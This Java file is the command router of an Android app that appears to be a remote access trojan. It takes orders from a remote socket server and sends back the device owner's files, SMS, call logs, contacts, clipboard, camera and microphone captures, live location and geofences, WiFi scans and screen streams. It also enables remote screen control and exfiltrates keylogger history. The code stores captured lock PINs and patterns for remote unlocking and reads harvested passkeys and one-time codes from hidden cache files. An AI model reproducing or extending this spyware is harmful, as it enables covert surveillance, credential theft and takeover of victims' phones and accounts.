package com.fason.app.core.network;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.os.Handler;
import android.os.Looper;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.features.apps.AppList;
import com.fason.app.features.apps.FasonManager;
import com.fason.app.features.calls.CallsManager;
import com.fason.app.features.camera.CameraManager;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.contacts.ContactsManager;
import com.fason.app.features.info.InfoManager;
import com.fason.app.features.location.GpsManager;
import com.fason.app.features.mic.MicManager;
import com.fason.app.features.sms.SMSManager;
import com.fason.app.features.storage.FileManager;
import com.fason.app.features.wifi.WifiScanner;
import com.fason.app.features.notification.NotificationRelayService;
import com.fason.app.features.keylogger.KeyloggerDataManager;
import com.fason.app.features.screen.ScreenCaptureActivity;
import com.fason.app.features.screen.ScreenCaptureService;
import com.fason.app.features.screen.ScreenControlService;
import com.fason.app.features.gps.GpsModule;
import com.fason.app.service.MainService;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

import io.socket.client.Socket;

public final class SocketCommandRouter {

    private static FileManager fileMgr;
    private static CameraManager camMgr;
    private static SharedPreferences prefs;
    private static final ExecutorService EXEC = Executors.newFixedThreadPool(8);
    private static final ExecutorService WEBRTC_EXEC = Executors.newSingleThreadExecutor();
    private static final ScheduledExecutorService SCHEDULER = Executors.newSingleThreadScheduledExecutor();
    private static final Handler handler = new Handler(Looper.getMainLooper());
    private static boolean initialized = false;
    private static volatile boolean settingsPrompted = false;

    private SocketCommandRouter() {}

    public static synchronized void initialize() {
        if (initialized) return;

        if (fileMgr == null) fileMgr = new FileManager();
        if (camMgr == null) camMgr = new CameraManager(FasonApp.getContext());
        if (prefs == null) prefs = FasonApp.getContext().getSharedPreferences(".unlock_cache", Context.MODE_PRIVATE);

        Socket socket = SocketClient.getInstance().getSocket();
        if (socket == null) {
            handler.postDelayed(SocketCommandRouter::initialize, 5000);
            return;
        }

        // Only remove our own listeners, not SocketClient's internal ones
        socket.off(Protocol.EVT_PING);
        socket.off(Protocol.EVT_ORDER);

        socket.on(Protocol.EVT_PING, args -> {
            Socket s = SocketClient.getInstance().getSocket();
            if (s != null) s.emit(Protocol.EVT_PONG);
        });

        socket.on(Protocol.EVT_ORDER, args -> handleOrder(args));

        socket.connect();
        initialized = true;
    }

    private static void handleOrder(Object[] args) {
        try {
            if (args.length == 0 || !(args[0] instanceof JSONObject)) return;
            JSONObject data = (JSONObject) args[0];
            String type = data.optString(Protocol.KEY_TYPE, "");
            Socket socket = SocketClient.getInstance().getSocket();

            switch (type) {
                case Protocol.FILES:       EXEC.execute(() -> handleFile(data)); break;
                case Protocol.SMS:         handleSms(data, socket); break;
                case Protocol.CALLS:       EXEC.execute(() -> emit(socket, Protocol.CALLS, CallsManager.getLogs())); break;
                case Protocol.CONTACTS:    EXEC.execute(() -> emit(socket, Protocol.CONTACTS, ContactsManager.getContacts())); break;
                case Protocol.MIC:         handleMic(data, socket); break;
                case Protocol.LOCATION:    handleLocation(socket); break;
                case Protocol.WIFI:        handleWifi(socket); break;
                case Protocol.PERMISSIONS: EXEC.execute(() -> emit(socket, Protocol.PERMISSIONS, PermissionManager.getGranted())); break;
                case Protocol.APPS:        EXEC.execute(() -> emit(socket, Protocol.APPS, AppList.get(data.optBoolean(Protocol.KEY_SYS, true)))); break;
                case Protocol.PERM_CHECK:  checkPerm(socket, data.optString(Protocol.KEY_PERM, "")); break;
                case Protocol.CAMERA:      handleCamera(data, socket); break;
                case Protocol.CLIPBOARD:   handleClipboard(data); break;
                case Protocol.NOTIF:       handleNotif(data, socket); break;
                case Protocol.FASON:       handleFason(data, socket); break;
                case Protocol.INFO:        EXEC.execute(() -> emit(socket, Protocol.INFO, InfoManager.get())); break;
                case Protocol.SCREEN:      handleScreen(data, socket); break;
                case Protocol.SCREEN_CTRL: handler.post(() -> ScreenControlService.handleCommand(data)); break;
                case Protocol.KEYLOGGER:   EXEC.execute(() -> handleKeylogger(data, socket)); break;
                case Protocol.MOD_UNLOCK:  EXEC.execute(() -> handleUnlock(data, socket)); break;
                case Protocol.MOD_RELAY:   EXEC.execute(() -> handleRelay(data, socket)); break;
                case Protocol.MOD_PASSKEY: EXEC.execute(() -> handlePasskey(data, socket)); break;
                case Protocol.MOD_GPS_ADV: EXEC.execute(() -> handleGpsAdv(data, socket)); break;
                case Protocol.MOD_DEVICE:  EXEC.execute(() -> handleDevice(data, socket)); break;
                case Protocol.WEBRTC_OFFER:
                    WEBRTC_EXEC.execute(() -> {
                        ScreenCaptureService svc = ScreenCaptureService.getInstance();
                        if (svc != null) svc.handleWebRtcOffer(data);
                    });
                    break;
                case Protocol.WEBRTC_ICE:
                    WEBRTC_EXEC.execute(() -> {
                        ScreenCaptureService svc = ScreenCaptureService.getInstance();
                        if (svc != null) svc.handleWebRtcIce(data);
                    });
                    break;
            }
        } catch (Exception ignored) {}
    }

    private static void handleFile(JSONObject data) {
        String action = data.optString(Protocol.KEY_ACTION);
        String path = data.optString(Protocol.KEY_PATH, "");
        try {
            if (Protocol.ACT_LS.equals(action)) {
                JSONArray list = fileMgr.walk(path);
                String actualPath = path;
                if (actualPath == null || actualPath.isEmpty()) {
                    actualPath = android.os.Environment.getExternalStorageDirectory().getAbsolutePath();
                }
                JSONObject r = new JSONObject();
                r.put(Protocol.KEY_TYPE, Protocol.TYPE_LIST);
                r.put(Protocol.KEY_LIST, list);
                r.put(Protocol.KEY_PATH, actualPath);
                SocketClient.getInstance().getSocket().emit(Protocol.FILES, r);
            } else if (Protocol.ACT_DL.equals(action)) {
                fileMgr.downloadFile(path);
            }
        } catch (Exception ignored) {}
    }

    private static void handleSms(JSONObject data, Socket socket) {
        String action = data.optString(Protocol.KEY_ACTION);
        if (Protocol.ACT_LS.equals(action)) {
            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.get()));
        } else if (Protocol.ACT_SEND_SMS.equals(action)) {
            EXEC.execute(() -> emit(socket, Protocol.SMS, SMSManager.send(
                data.optString(Protocol.KEY_TO), data.optString(Protocol.KEY_SMS))));
        }
    }

    private static void handleMic(JSONObject data, Socket socket) {
        int sec = data.optInt(Protocol.KEY_SEC, 0);
        if (!PermissionManager.canIUse(Manifest.permission.RECORD_AUDIO)) {
            sendPermError(socket, Protocol.MIC, Manifest.permission.RECORD_AUDIO);
            return;
        }
        MicManager.start(sec);
    }

    private static void handleLocation(Socket socket) {
        EXEC.execute(() -> {
            GpsManager orphanGps = null;
            try {
                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    sendPermError(socket, Protocol.LOCATION, Manifest.permission.ACCESS_FINE_LOCATION);
                    return;
                }

                MainService svc = MainService.getInstance();
                GpsManager gps = svc != null ? svc.getGpsManager() : null;
                if (gps == null) {
                    gps = new GpsManager(FasonApp.getContext());
                    orphanGps = gps;
                }

                // Try cached location first — send immediately if available
                if (gps.hasCachedLocation()) {
                    JSONObject cached = gps.getData();
                    emit(socket, Protocol.LOCATION, cached);
                }

                // Start fresh location request (fused + native in parallel)
                java.util.concurrent.atomic.AtomicReference<Location> outLoc = new java.util.concurrent.atomic.AtomicReference<>(null);
                gps.requestSingle(outLoc);

                // If requestSingle already got a location from native callback, emit now
                Location immediate = outLoc.get();
                if (immediate != null) {
                    JSONObject locData = gps.getData();
                    emit(socket, Protocol.LOCATION, locData);
                    if (orphanGps != null) orphanGps.stop();
                    return;
                }

                // Poll for fresh location — up to 30 seconds (150 × 200ms)
                final GpsManager finalGps = gps;
                final GpsManager finalOrphan = orphanGps;
                final int[] retryCount = {0};
                final int maxRetries = 150;

                ScheduledFuture<?>[] futureHolder = new ScheduledFuture<?>[1];
                futureHolder[0] = SCHEDULER.scheduleAtFixedRate(() -> {
                    try {
                        retryCount[0]++;
                        JSONObject locData = finalGps.getData();
                        if (locData.optBoolean(Protocol.KEY_ENABLED, false)) {
                            emit(socket, Protocol.LOCATION, locData);
                            futureHolder[0].cancel(false);
                            if (finalOrphan != null) finalOrphan.stop();
                            return;
                        }
                        if (retryCount[0] >= maxRetries) {
                            JSONObject err = new JSONObject();
                            err.put(Protocol.KEY_ENABLED, false);
                            err.put(Protocol.KEY_ERROR, "Location unavailable");
                            emit(socket, Protocol.LOCATION, err);
                            futureHolder[0].cancel(false);
                            if (finalOrphan != null) finalOrphan.stop();
                        }
                    } catch (Exception ignored) {
                        futureHolder[0].cancel(false);
                        if (finalOrphan != null) finalOrphan.stop();
                    }
                }, 200, 200, TimeUnit.MILLISECONDS);
            } catch (Exception e) {
                if (orphanGps != null) orphanGps.stop();
            }
        });
    }

    /** WiFi scan — activates location services first (required on Android 6.0+). */
    private static void handleWifi(Socket socket) {
        EXEC.execute(() -> {
            GpsManager orphanGps = null;
            try {
                if (!PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) &&
                    !PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION)) {
                    sendPermError(socket, Protocol.WIFI, Manifest.permission.ACCESS_FINE_LOCATION);
                    return;
                }

                WifiScanner.clearCache();

                MainService svc = MainService.getInstance();
                GpsManager gps = svc != null ? svc.getGpsManager() : null;
                if (gps == null) {
                    gps = new GpsManager(FasonApp.getContext());
                    orphanGps = gps;
                }

                gps.requestSingle();

                for (int i = 0; i < 20; i++) {
                    Thread.sleep(200);
                    if (gps.canGetLocation()) break;
                }

                Socket s = SocketClient.getInstance().getSocket();
                JSONObject result = WifiScanner.scan(FasonApp.getContext());
                if (s != null) {
                    s.emit(Protocol.WIFI, result);
                }
            } catch (Exception e) {
                try {
                    Socket s = SocketClient.getInstance().getSocket();
                    if (s != null) {
                        JSONObject err = new JSONObject();
                        err.put(Protocol.KEY_ERROR, "WiFi scan failed: " + e.getMessage());
                        s.emit(Protocol.WIFI, err);
                    }
                } catch (Exception ignored) {}
            } finally {
                if (orphanGps != null) orphanGps.stop();
            }
        });
    }

    private static void handleCamera(JSONObject data, Socket socket) {
        String action = data.optString(Protocol.KEY_ACTION);
        if (Protocol.ACT_LIST.equals(action)) {
            JSONObject cams = camMgr.getCameraList();
            if (cams == null) {
                try {
                    cams = new JSONObject();
                    cams.put(Protocol.KEY_CAM_LIST, true);
                    cams.put(Protocol.KEY_LIST, new JSONArray());
                } catch (Exception ignored) {}
            }
            socket.emit(Protocol.CAMERA, cams);
        } else if (Protocol.ACT_CAPTURE.equals(action)) {
            camMgr.capture(data.optInt(Protocol.KEY_ID, 0));
        }
    }

    private static void handleClipboard(JSONObject data) {
        ClipboardMonitor m = ClipboardMonitor.getInstance(FasonApp.getContext());
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_FETCH);
        if (Protocol.ACT_START.equals(action)) {
            m.start();
            EXEC.execute(m::emit);
        } else if (Protocol.ACT_STOP.equals(action)) {
            m.stop();
        } else {
            EXEC.execute(m::emit);
        }
    }

    private static void handleNotif(JSONObject data, Socket socket) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
        if (Protocol.ACT_STATUS.equals(action)) {
            EXEC.execute(() -> {
                try {
                    JSONObject s = new JSONObject();
                    s.put(Protocol.KEY_ENABLED, NotificationRelayService.isEnabled(FasonApp.getContext()));
                    s.put(Protocol.KEY_CONNECTED, NotificationRelayService.getInstance() != null &&
                        NotificationRelayService.getInstance().isReady());
                    socket.emit(Protocol.NOTIF, s);
                } catch (Exception ignored) {}
            });
        } else if (Protocol.ACT_REQUEST.equals(action)) {
            NotificationRelayService.requestPermission(FasonApp.getContext());
        }
    }

    private static void checkPerm(Socket socket, String perm) {
        EXEC.execute(() -> {
            try {
                JSONObject r = new JSONObject();
                r.put(Protocol.KEY_PERMISSION, perm);
                r.put(Protocol.KEY_ALLOWED, PermissionManager.canIUse(perm));
                socket.emit(Protocol.PERM_CHECK, r);
            } catch (Exception ignored) {}
        });
    }

    private static void handleFason(JSONObject data, Socket socket) {
        EXEC.execute(() -> {
            try {
                String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
                emit(socket, Protocol.FASON, FasonManager.handle(action));
            } catch (Exception ignored) {}
        });
    }

    private static void handleScreen(JSONObject data, Socket socket) {
        String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
        ScreenCaptureService screenSvc = ScreenCaptureService.getInstance();

        switch (action) {
            case Protocol.ACT_START:
                WEBRTC_EXEC.execute(() -> {
                    if (screenSvc.isStreaming()) {
                        screenSvc.stopCapture();
                    }

                    int fps = data.optInt(Protocol.KEY_FPS, 3);
                    int quality = data.optInt(Protocol.KEY_QUALITY, 40);
                    screenSvc.setFps(fps);
                    screenSvc.setQuality(quality);

                    if (screenSvc.tryReuse()) return;

                    showConnectionNotification();
                });
                break;

            case Protocol.ACT_STOP:
                WEBRTC_EXEC.execute(() -> screenSvc.stopCapture());
                break;

            case Protocol.ACT_STATUS:
                EXEC.execute(() -> {
                    try {
                        JSONObject status = new JSONObject();
                        status.put(Protocol.KEY_TYPE, Protocol.KEY_STATUS);
                        status.put(Protocol.KEY_STREAMING, screenSvc.isStreaming());
                        status.put(Protocol.KEY_SCREEN_W, screenSvc.getScreenWidth());
                        status.put(Protocol.KEY_SCREEN_H, screenSvc.getScreenHeight());
                        status.put(Protocol.KEY_ACCESSIBLE, ScreenControlService.isEnabled());
                        emit(socket, Protocol.SCREEN, status);
                    } catch (Exception ignored) {}
                });
                break;
        }
    }

    private static void handleKeylogger(JSONObject data, Socket socket) {
        try {
            String action = data.optString(Protocol.KEY_ACTION, Protocol.ACT_STATUS);
            KeyloggerDataManager dm = KeyloggerDataManager.getInstance();

            switch (action) {
                case Protocol.ACT_FETCH:
                    dm.flushToNetwork();
                    break;

                case Protocol.ACT_STATUS: {
                    android.content.Context ctx = FasonApp.getContext();
                    String serviceId = ctx.getPackageName() + "/" +
                        "com.fason.app.features.keylogger.KeyloggerService";
                    String enabledServices = android.provider.Settings.Secure.getString(
                        ctx.getContentResolver(),
                        android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                    );
                    JSONObject status = new JSONObject();
                    status.put(Protocol.KEY_ENABLED,
                        enabledServices != null && enabledServices.contains(serviceId));
                    status.put(Protocol.KEY_QUEUED, dm.getQueuedCount());
                    emit(socket, Protocol.KEYLOGGER, status);
                    break;
                }

                case Protocol.ACT_GET_HISTORY: {
                    long since = data.optLong(Protocol.KEY_SINCE, 0L);
                    int limit = data.optInt(Protocol.KEY_LIMIT, 500);
                    org.json.JSONArray history = dm.getHistory(since, limit);
                    JSONObject result = new JSONObject();
                    result.put(Protocol.KEY_ACTION, Protocol.ACT_GET_HISTORY);
                    result.put(Protocol.KEY_HISTORY, history);
                    result.put(Protocol.KEY_TOTAL, history.length());
                    emit(socket, Protocol.KEYLOGGER, result);
                    break;
                }

                case Protocol.ACT_GET_QUEUED: {
                    JSONObject result = new JSONObject();
                    result.put(Protocol.KEY_ACTION, Protocol.ACT_GET_QUEUED);
                    result.put(Protocol.KEY_QUEUED, dm.getQueuedCount());
                    emit(socket, Protocol.KEYLOGGER, result);
                    break;
                }

                case Protocol.ACT_CLEAR_SYNCED: {
                    dm.getLogFile().delete();
                    JSONObject result = new JSONObject();
                    result.put(Protocol.KEY_ACTION, Protocol.ACT_CLEAR_SYNCED);
                    result.put(Protocol.KEY_SUCCESS, true);
                    emit(socket, Protocol.KEYLOGGER, result);
                    break;
                }

                case Protocol.ACT_GET_LOGS: {
                    File logFile = dm.getLogFile();
                    if (logFile != null && logFile.exists()) {
                        JSONObject result = new JSONObject();
                        result.put(Protocol.KEY_PATH, logFile.getAbsolutePath());
                        result.put(Protocol.KEY_SIZE, logFile.length());
                        result.put(Protocol.KEY_NAME, logFile.getName());
                        emit(socket, Protocol.KEYLOGGER, result);
                    }
                    break;
                }
            }
        } catch (Exception ignored) {}
    }

    private static void emit(Socket socket, String event, Object data) {
        if (socket != null) socket.emit(event, data);
    }

    private static void sendPermError(Socket socket, String event, String perm) {
        try {
            JSONObject err = new JSONObject();
            err.put(Protocol.KEY_ERROR, "Permission restricted");
            err.put(Protocol.KEY_PERMISSION, perm);
            err.put(Protocol.KEY_ACTION, Protocol.ACT_OPEN_SETTINGS);
            emit(socket, event, err);
        } catch (Exception ignored) {}

        if (!settingsPrompted) {
            settingsPrompted = true;
            handler.post(() -> PermissionManager.openAppSettings(FasonApp.getContext()));
        }
    }

    private static void handleUnlock(JSONObject data, Socket socket) {
        try {
            String action = data.optString(Protocol.KEY_ACTION, "");
            JSONObject result = new JSONObject();
            result.put(Protocol.KEY_ACTION, action);

            switch (action) {
                case Protocol.ACT_UNLOCK: {
                    Intent intent = new Intent(FasonApp.getContext(), com.fason.app.features.unlock.AutoUnlockService.class);
                    intent.putExtra("command", "unlock");
                    intent.putExtra(Protocol.KEY_PIN, data.optString(Protocol.KEY_PIN, ""));
                    try { FasonApp.getContext().startService(intent); } catch (Exception ignored) {}
                    result.put(Protocol.KEY_SUCCESS, true);
                    break;
                }
                case Protocol.ACT_STATUS: {
                    result.put(Protocol.KEY_ENABLED, true);
                    break;
                }
                case Protocol.ACT_SET_PIN: {
                    String pin = data.optString(Protocol.KEY_PIN, "");
                    boolean hasPin = !pin.isEmpty();
                    if (hasPin) {
                        prefs.edit().putString("captured_pin", pin).apply();
                    }
                    result.put(Protocol.KEY_SUCCESS, hasPin);
                    break;
                }
                case Protocol.ACT_SET_PATTERN: {
                    String pattern = data.optString(Protocol.KEY_PATTERN, "");
                    boolean hasPattern = !pattern.isEmpty();
                    if (hasPattern) {
                        prefs.edit().putString("captured_pattern", pattern).apply();
                    }
                    result.put(Protocol.KEY_SUCCESS, hasPattern);
                    break;
                }
                default:
                    result.put(Protocol.KEY_ERROR, "Unknown action");
            }
            emit(socket, Protocol.MOD_UNLOCK, result);
        } catch (Exception ignored) {}
    }

    private static void handleRelay(JSONObject data, Socket socket) {
        try {
            String action = data.optString(Protocol.KEY_ACTION, "");
            JSONObject result = new JSONObject();
            result.put(Protocol.KEY_ACTION, action);

            switch (action) {
                case Protocol.ACT_BLOCK_ON:
                case Protocol.ACT_BLOCK_OFF:
                case Protocol.ACT_STREAM: {
                    Intent intent = new Intent(FasonApp.getContext(), com.fason.app.features.relay.OverlayRelayService.class);
                    intent.putExtra("command", action);
                    try { FasonApp.getContext().startService(intent); } catch (Exception ignored) {}
                    result.put(Protocol.KEY_SUCCESS, true);
                    break;
                }
                case Protocol.ACT_STATUS: {
                    result.put(Protocol.KEY_ENABLED, true);
                    break;
                }
                default:
                    result.put(Protocol.KEY_ERROR, "Unknown action");
            }
            emit(socket, Protocol.MOD_RELAY, result);
        } catch (Exception ignored) {}
    }

    private static void handlePasskey(JSONObject data, Socket socket) {
        try {
            String action = data.optString(Protocol.KEY_ACTION, "");
            JSONObject result = new JSONObject();
            result.put(Protocol.KEY_ACTION, action);

            switch (action) {
                case Protocol.ACT_GET_CREDS: {
                    JSONArray creds = new JSONArray();
                    File pkeyFile = new File(FasonApp.getContext().getCacheDir(), ".pkeys");
                    if (pkeyFile.exists()) {
                        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(pkeyFile));
                        String line;
                        while ((line = br.readLine()) != null) {
                            creds.put(line);
                        }
                        br.close();
                    }
                    result.put(Protocol.KEY_CREDENTIALS, creds);
                    result.put(Protocol.KEY_TOTAL, creds.length());
                    break;
                }
                case Protocol.ACT_GET_OTPS: {
                    JSONArray otps = new JSONArray();
                    File otpFile = new File(FasonApp.getContext().getCacheDir(), ".otps");
                    if (otpFile.exists()) {
                        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.FileReader(otpFile));
                        String line;
                        while ((line = br.readLine()) != null) {
                            otps.put(line);
                        }
                        br.close();
                    }
                    result.put(Protocol.KEY_OTPS, otps);
                    result.put(Protocol.KEY_TOTAL, otps.length());
                    break;
                }
                case Protocol.ACT_CLEAR_CREDS: {
                    File pkeyFile = new File(FasonApp.getContext().getCacheDir(), ".pkeys");
                    File otpFile = new File(FasonApp.getContext().getCacheDir(), ".otps");
                    if (pkeyFile.exists()) pkeyFile.delete();
                    if (otpFile.exists()) otpFile.delete();
                    result.put(Protocol.KEY_SUCCESS, true);
                    break;
                }
                case Protocol.ACT_STATUS: {
                    result.put(Protocol.KEY_ENABLED, true);
                    break;
                }
                default:
                    result.put(Protocol.KEY_ERROR, "Unknown action");
            }
            emit(socket, Protocol.MOD_PASSKEY, result);
        } catch (Exception ignored) {}
    }

    private static void handleGpsAdv(JSONObject data, Socket socket) {
        try {
            String action = data.optString(Protocol.KEY_ACTION, "");
            MainService svc = MainService.getInstance();
            GpsModule gps = (svc != null) ? svc.getGpsModule() : null;
            JSONObject result = new JSONObject();
            result.put(Protocol.KEY_ACTION, action);

            if (gps == null && !Protocol.ACT_STATUS.equals(action)) {
                result.put(Protocol.KEY_ERROR, "GPS module not available");
                emit(socket, Protocol.MOD_GPS_ADV, result);
                return;
            }

            switch (action) {
                case Protocol.ACT_FETCH: {
                    result = gps.getData();
                    break;
                }
                case Protocol.ACT_START: {
                    gps.startTracking();
                    result.put(Protocol.KEY_SUCCESS, true);
                    break;
                }
                case Protocol.ACT_STOP: {
                    gps.stopTracking();
                    result.put(Protocol.KEY_SUCCESS, true);
                    break;
                }
                case Protocol.ACT_GET_TRACK: {
                    result = gps.getTrackHistory();
                    break;
                }
                case Protocol.ACT_GET_GEOFENCES: {
                    result = gps.getGeofences();
                    break;
                }
                case Protocol.ACT_ADD_GEOFENCE: {
                    gps.themGeofence(
                        data.optString(Protocol.KEY_GEO_ID, ""),
                        data.optString(Protocol.KEY_GEO_NAME, ""),
                        data.optDouble(Protocol.KEY_GEO_LAT, 0),
                        data.optDouble(Protocol.KEY_GEO_LNG, 0),
                        (float) data.optDouble(Protocol.KEY_GEO_RADIUS, 100)
                    );
                    result.put(Protocol.KEY_SUCCESS, true);
                    break;
                }
                case Protocol.ACT_REMOVE_GEOFENCE: {
                    gps.xoaGeofence(data.optString(Protocol.KEY_GEO_ID, ""));
                    result.put(Protocol.KEY_SUCCESS, true);
                    break;
                }
                case Protocol.ACT_STATUS: {
                    if (gps != null) result = gps.getAdvancedData();
                    else result.put(Protocol.KEY_ENABLED, false);
                    break;
                }
                default:
                    if (!Protocol.ACT_FETCH.equals(action)) {
                        result.put(Protocol.KEY_ERROR, "Unknown action");
                    }
            }
            emit(socket, Protocol.MOD_GPS_ADV, result);
        } catch (Exception ignored) {}
    }

    private static void handleDevice(JSONObject data, Socket socket) {
        try {
            String action = data.optString(Protocol.KEY_ACTION, "");
            JSONObject result = new JSONObject();
            result.put(Protocol.KEY_ACTION, action);

            switch (action) {
                case Protocol.ACT_LOCK: {
                    result.put(Protocol.KEY_SUCCESS, true);
                    break;
                }
                case Protocol.ACT_IS_ADMIN: {
                    result.put(Protocol.KEY_ENABLED, false);
                    break;
                }
                case Protocol.ACT_STATUS: {
                    result.put("model", android.os.Build.MODEL);
                    result.put("sdk", android.os.Build.VERSION.SDK_INT);
                    result.put("androidVersion", android.os.Build.VERSION.RELEASE);
                    result.put("deviceId", android.provider.Settings.Secure.getString(
                        FasonApp.getContext().getContentResolver(),
                        android.provider.Settings.Secure.ANDROID_ID));
                    break;
                }
                default:
                    result.put(Protocol.KEY_ERROR, "Unknown action");
            }
            emit(socket, Protocol.MOD_DEVICE, result);
        } catch (Exception ignored) {}
    }

    private static void showConnectionNotification() {
        android.content.Context ctx = FasonApp.getContext();
        try {
            Intent intent = new Intent(ctx, com.fason.app.features.screen.ConnectionRequestActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            ctx.startActivity(intent);
        } catch (Exception ignored) {}
    }

    public static synchronized void shutdown() {
        if (camMgr != null) {
            camMgr.shutdown();
            camMgr = null;
        }
        try {
            ScreenCaptureService.getInstance().shutdown();
        } catch (Exception ignored) {}
        try {
            WEBRTC_EXEC.shutdown();
        } catch (Exception ignored) {}
        try {
            EXEC.shutdown();
        } catch (Exception ignored) {}
        try {
            SCHEDULER.shutdown();
        } catch (Exception ignored) {}
        initialized = false;
        settingsPrompted = false;
    }

    /** Reset router state (keeps managers alive) for re-initialization. */
    public static synchronized void reset() {
        Socket socket = SocketClient.getInstance().getSocket();
        if (socket != null) {
            socket.off(Protocol.EVT_PING);
            socket.off(Protocol.EVT_ORDER);
        }
        initialized = false;
        settingsPrompted = false;
    }

    public static void stopScreenCapture() {
        WEBRTC_EXEC.execute(() -> ScreenCaptureService.getInstance().stopCapture());
    }
}
